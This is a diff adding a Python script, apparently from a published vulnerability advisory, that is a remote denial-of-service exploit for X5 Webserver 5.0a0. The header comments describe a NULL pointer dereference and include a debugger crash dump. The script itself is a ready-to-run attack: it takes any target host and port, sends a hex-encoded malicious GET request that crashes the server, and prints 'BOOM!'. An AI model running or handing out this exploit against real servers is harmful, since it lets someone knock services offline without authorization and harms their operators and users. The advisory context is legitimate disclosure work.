@@ -1,0 +1,101 @@
+#!/usr/bin/env python
+#
+#
+# X5 Webserver 5.0 Remote Denial Of Service Exploit
+#
+#
+# Vendor: iMatrix
+# Product web page: http://www.xitami.com
+# Affected version: 5.0a0
+#
+# Summary: X5 is the latest generation web server from iMatix Corporation.
+# The Xitami product line stretches back to 1996. X5 is built using iMatix's
+# current Base2 technology for multithreading applications. On multicore machines,
+# it is much more scalable than Xitami/2.
+#
+# Desc: The vulnerability is caused due to a NULL pointer dereference when processing
+# malicious HEAD and GET requests. This can be exploited to cause denial of service
+# scenario.
+#
+# ----------------------------------------------------------------------------
+#
+# (12c0.164c): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# *** WARNING: Unable to verify checksum for C:\zslab\ws\64327\xitami-5.0a0-windows\xitami.exe
+# *** ERROR: Module load completed but symbols could not be loaded for C:\zslab\ws\64327\xitami-5.0a0-windows\xitami.exe
+# eax=0070904d ebx=03a91808 ecx=0070904d edx=00000000 esi=0478fef4 edi=0478fe8c
+# eip=00503ae0 esp=0478fb28 ebp=0478fb48 iopl=0         nv up ei pl zr na pe nc
+# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+# xitami+0x103ae0:
+# 00503ae0 8b02            mov     eax,dword ptr [edx]  ds:002b:00000000=????????
+# 0:004> kb
+#  # ChildEBP RetAddr  Args to Child              
+# WARNING: Stack unwind information not available. Following frames may be wrong.
+# 00 0478fb48 00460ee6 0ace0840 04025ea0 0478fd78 xitami+0x103ae0
+# 01 0478fe8c 0045f6fa 0ace0bd8 0478ff28 cccccccc xitami+0x60ee6
+# 02 0478fee8 004c60a1 0478ff14 00000000 0478ff38 xitami+0x5f6fa
+# 03 0478ff28 004fdca3 03a90858 03a67e38 00000000 xitami+0xc60a1
+# 04 0478ff40 00510293 03a90858 fc134d7d 00000000 xitami+0xfdca3
+# 05 0478ff7c 00510234 00000000 0478ff94 7679338a xitami+0x110293
+# 06 0478ff88 7679338a 03a91808 0478ffd4 77029902 xitami+0x110234
+# 07 0478ff94 77029902 03a91808 7134bcc2 00000000 kernel32!BaseThreadInitThunk+0xe
+# 08 0478ffd4 770298d5 00510190 03a91808 00000000 ntdll!__RtlUserThreadStart+0x70
+# 09 0478ffec 00000000 00510190 03a91808 00000000 ntdll!_RtlUserThreadStart+0x1b
+#
+# ----------------------------------------------------------------------------
+#
+# Tested on: Microsoft Windows XP Professional SP3 (EN)
+#            Microsoft Windows 7 Ultimate SP1 (EN)
+#
+#
+# Vulnerability discovered by Stefan Petrushevski aka sm - <stefan@zeroscience.mk>
+#
+#
+# Advisory ID: ZSL-2016-5377
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5377.php
+#
+#
+# 15.11.2016
+#
+
+
+import sys, socket
+
+if len(sys.argv) < 3:
+	print '------- X5 Webserver 5.0a0 - Remote Denial of Service ------\n'
+	print '\nUsage: ' + sys.argv[0] + ' <target> <port>\n'
+	print 'Example: ' + sys.argv[0] + ' 8.8.8.8 80\n'
+	print '------------------------------------------------------------\n'
+	sys.exit(0)
+
+host = sys.argv[1]
+port = int(sys.argv[2])
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect((host, port))
+s.settimeout(666)
+payload = (
+'\x47\x45\x54\x20\x2f\x50\x52\x4e\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a'
+'\x48\x6f\x73\x74\x3a\x20\x31\x37\x32\x2e\x31\x39\x2e\x30\x2e\x32\x31\x35\x0d'
+'\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x5a\x53\x4c\x2d\x46\x75'
+'\x7a\x7a\x65\x72\x2d\x41\x67\x65\x6e\x74\x2f\x34\x2e\x30\x2e\x32\x38\x35\x20'
+'\x0d\x0a\x41\x63\x63\x65\x70\x74\x3a\x20\x74\x65\x78\x74\x2f\x78\x6d\x6c\x2c'
+'\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x6d\x6c\x2c\x61\x70\x70'
+'\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x68\x74\x6d\x6c\x2b\x78\x6d\x6c\x2c'
+'\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x3b\x71\x3d\x30\x2e\x39\x2c\x74\x65\x78'
+'\x74\x2f\x70\x6c\x61\x69\x6e\x3b\x71\x3d\x30\x2e\x38\x2c\x69\x6d\x61\x67\x65'
+'\x2f\x70\x6e\x67\x2c\x2a\x2f\x2a\x3b\x71\x3d\x30\x2e\x35\x0d\x0a\x41\x63\x63'
+'\x65\x70\x74\x2d\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x65\x6e\x2d\x75\x73'
+'\x2c\x65\x6e\x3b\x71\x3d\x30\x2e\x35\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x45'
+'\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x20\x67\x7a\x69\x70\x2c\x64\x65\x66\x6c\x61'
+'\x74\x65\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x43\x68\x61\x72\x73\x65\x74\x3a'
+'\x20\x49\x53\x4f\x2d\x38\x38\x35\x39\x2d\x31\x2c\x75\x74\x66\x2d\x38\x3b\x71'
+'\x3d\x30\x2e\x37\x2c\x2a\x3b\x71\x3d\x30\x2e\x37\x0d\x0a\x4b\x65\x65\x70\x2d'
+'\x41\x6c\x69\x76\x65\x3a\x20\x33\x30\x30\x0d\x0a\x43\x6f\x6e\x6e\x65\x63\x74'
+'\x69\x6f\x6e\x3a\x20\x6b\x65\x65\x70\x2d\x61\x6c\x69\x76\x65\x0d\x0a\x0d\x0a'
+)
+
+s.send(payload)
+s.close
+print 'BOOM! \n'
